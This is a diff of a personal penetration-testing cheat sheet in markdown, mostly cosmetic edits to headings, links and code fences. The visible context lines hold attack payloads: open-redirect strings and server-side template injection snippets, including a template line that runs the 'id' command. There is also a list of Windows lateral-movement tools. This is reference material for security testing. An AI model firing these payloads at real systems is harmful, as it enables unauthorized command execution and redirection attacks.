@@ -1,9 +1,6 @@
 
-# Adding new topics daily & please feel free to let me know if there any wrong info is given in the CheatSheet
+# My personal CheatSheet
 <img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />
-
-
-# I need some time to make it useful :)
 
 ### Contents:
   - [Categories](#contents)
@@ -78,7 +75,7 @@
     - [psexec](#psexec)
     - [smbexec](#smbexec)
     - [wmiexec](#wmiexec)
-    - [dcomexec](#)
+    - [dcomexec](#dcomexec)
     - [crackmapexec](#crackmapexec)
     - [smbclient](#smbclient)
   - [evil-winrm](#evil-winrm)
@@ -228,6 +225,7 @@ GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 4. Try to figure out how token are generated
 
 <img src="/assets/img/password-reset.jpeg?raw=true"/>
+
 -------------------------------------------------------------------------------------------------------------
 # PHP filters
 
@@ -270,7 +268,7 @@ if(!$con)...
 # Open web redirect
 
 ### Open web redirect common payloads
-```
+```xml
 /%09/example.com
 /%2f%2fexample.com
 /%2f%2f%2fbing.com%2f%3fwww.omise.co
@@ -554,7 +552,7 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 {{ . }}
 {{.Email}}
 {{.Password}}
-{{ .DebugCmd "id" }}
+{{ .system "id" }}
 ```
 ### `Twig (PHP)`
 ```
